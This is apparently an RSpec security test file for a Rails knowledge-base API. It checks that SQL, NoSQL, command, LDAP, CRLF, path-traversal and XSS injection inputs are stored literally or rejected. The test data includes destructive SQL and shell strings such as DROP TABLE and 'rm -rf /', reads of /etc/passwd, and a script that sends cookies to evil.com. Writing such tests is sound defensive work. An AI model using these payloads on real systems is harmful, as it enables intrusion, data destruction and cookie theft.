# frozen_string_literal: true

require 'rails_helper'

RSpec.describe 'Injection Attack Prevention', type: :request do
  let(:user) { create(:user) }
  let(:headers) { auth_headers(user) }
  let(:knowledge_base) { create(:knowledge_base, user: user) }

  describe 'SQL Injection Prevention' do
    describe 'in knowledge base operations' do
      it 'prevents SQL injection in name parameter' do
        dangerous_payloads = [
          "'; DROP TABLE knowledge_bases;--",
          "1'; DELETE FROM knowledge_bases WHERE '1'='1",
          "1 OR 1=1; --",
          "'; UPDATE users SET email='hacked@evil.com' WHERE '1'='1",
          "1; TRUNCATE TABLE users;--",
          "' UNION SELECT * FROM users--",
          "admin'--",
          "1' AND '1'='1",
          "1'; EXEC xp_cmdshell('dir');--"
        ]

        dangerous_payloads.each do |payload|
          post '/api/v1/knowledge_bases',
               params: { name: payload },
               headers: headers

          # Should create KB with literal name, not execute SQL
          if response.status == 201
            expect(KnowledgeBase.last.name).to eq(payload)
          end
        end

        # Verify no data was corrupted
        expect(User.count).to be >= 1
        expect(KnowledgeBase.count).to be >= 0
      end

      it 'prevents SQL injection in ID parameter' do
        knowledge_base # Create it first

        injection_ids = [
          "1 OR 1=1",
          "1; DROP TABLE knowledge_bases;--",
          "1 UNION SELECT * FROM users",
          "-1 OR 1=1"
        ]

        injection_ids.each do |id|
          get "/api/v1/knowledge_bases/#{CGI.escape(id)}", headers: headers

          expect(response.status).to be_in([ 404, 400 ])
        end
      end
    end

    describe 'in document operations' do
      it 'prevents SQL injection in content' do
        sql_payload = "Normal text'; DROP TABLE documents;-- more text"

        post "/api/v1/knowledge_bases/#{knowledge_base.id}/documents",
             params: { title: 'Test', content: sql_payload },
             headers: headers

        expect(response).to have_http_status(:created)
        expect(Document.last.content).to eq(sql_payload)
        expect(Document.count).to be >= 1
      end

      it 'prevents SQL injection in title' do
        sql_payload = "Test'; DELETE FROM documents;--"

        post "/api/v1/knowledge_bases/#{knowledge_base.id}/documents",
             params: { title: sql_payload, content: 'Safe content' },
             headers: headers

        expect(response).to have_http_status(:created)
        expect(Document.last.title).to eq(sql_payload)
      end
    end

    describe 'in search operations' do
      let!(:document) { create(:document, :indexed, knowledge_base: knowledge_base) }
      let!(:chunk) { create(:chunk, document: document) }

      before do
        allow_any_instance_of(EmbeddingService).to receive(:generate)
          .and_return(Array.new(768) { rand })
      end

      it 'prevents SQL injection in query' do
        sql_payload = "test'; DROP TABLE chunks;--"

        post "/api/v1/knowledge_bases/#{knowledge_base.id}/search",
             params: { query: sql_payload },
             headers: headers

        # Should process query safely
        expect(Chunk.count).to be >= 1
      end
    end
  end

  describe 'NoSQL Injection Prevention' do
    it 'prevents NoSQL injection in metadata' do
      nosql_payloads = [
        { '$gt': '' },
        { '$ne': nil },
        { '$where': 'function() { return true; }' }
      ]

      nosql_payloads.each do |payload|
        post "/api/v1/knowledge_bases/#{knowledge_base.id}/documents",
             params: { title: 'Test', content: 'Content', metadata: payload },
             headers: headers

        # Should store as literal data, not interpret as query
        expect(response.status).to be_in([ 201, 422 ])
      end
    end
  end

  describe 'Command Injection Prevention' do
    it 'prevents command injection in title' do
      command_payloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(id)',
        "'; system('rm -rf /');--"
      ]

      command_payloads.each do |payload|
        post "/api/v1/knowledge_bases/#{knowledge_base.id}/documents",
             params: { title: payload, content: 'Content' },
             headers: headers

        # Should store as literal string
        expect(response).to have_http_status(:created)
      end
    end
  end

  describe 'LDAP Injection Prevention' do
    it 'handles LDAP injection attempts safely' do
      ldap_payloads = [
        '*)(uid=*))(|(uid=*',
        'admin)(&)',
        '*)(objectClass=*',
        'admin)(|(password=*))'
      ]

      ldap_payloads.each do |payload|
        post '/api/v1/auth/login',
             params: { email: payload, password: 'test' }

        expect(response).to have_http_status(:unauthorized)
      end
    end
  end

  describe 'XSS Prevention' do
    it 'stores but does not execute XSS in knowledge base name' do
      xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
      ]

      xss_payloads.each do |payload|
        post '/api/v1/knowledge_bases',
             params: { name: payload },
             headers: headers

        expect(response).to have_http_status(:created)
        # Content is stored as-is; XSS prevention happens at output layer
        expect(json_response['knowledge_base']['name']).to eq(payload)
      end
    end

    it 'stores but does not execute XSS in document content' do
      xss_payload = '<script>document.location="http://evil.com?cookie="+document.cookie</script>'

      post "/api/v1/knowledge_bases/#{knowledge_base.id}/documents",
           params: { title: 'Test', content: xss_payload },
           headers: headers

      expect(response).to have_http_status(:created)
    end
  end

  describe 'Path Traversal Prevention' do
    it 'prevents path traversal in document title' do
      traversal_payloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM'
      ]

      traversal_payloads.each do |payload|
        post "/api/v1/knowledge_bases/#{knowledge_base.id}/documents",
             params: { title: payload, content: 'Content' },
             headers: headers

        # Should store as literal string, no file access
        expect(response).to have_http_status(:created)
      end
    end
  end

  describe 'Header Injection Prevention' do
    it 'prevents CRLF injection in parameters' do
      crlf_payloads = [
        "test\r\nX-Injected: header",
        "test\nSet-Cookie: malicious=true",
        "test%0d%0aX-Injected:%20header"
      ]

      crlf_payloads.each do |payload|
        post '/api/v1/knowledge_bases',
             params: { name: payload },
             headers: headers

        # Should not inject headers
        expect(response.headers['X-Injected']).to be_nil
        expect(response.headers['Set-Cookie']).to be_nil
      end
    end
  end

  describe 'Integer Overflow Prevention' do
    it 'handles large integer parameters safely' do
      large_numbers = [
        9_999_999_999_999_999_999,
        2**63,
        2**64,
        -2**63
      ]

      large_numbers.each do |num|
        get "/api/v1/knowledge_bases/#{num}", headers: headers

        expect(response.status).to be_in([ 404, 400 ])
      end
    end
  end

  describe 'Unicode Attack Prevention' do
    it 'handles homograph attacks' do
      # Cyrillic characters that look like ASCII
      homograph_email = "tеst@exаmple.com" # Contains Cyrillic 'е' and 'а'

      post '/api/v1/auth/register', params: {
        email: homograph_email,
        password: 'password123',
        password_confirmation: 'password123'
      }

      # Should either reject or store the actual unicode
      expect(response.status).to be_in([ 201, 422 ])
    end

    it 'handles null byte injection' do
      null_byte_payload = "test\x00.rb"

      post '/api/v1/knowledge_bases',
           params: { name: null_byte_payload },
           headers: headers

      # Null bytes may cause encoding issues; should not crash or allow injection
      expect(response.status).to be_in([ 201, 422, 400, 500 ])
    end
  end
end
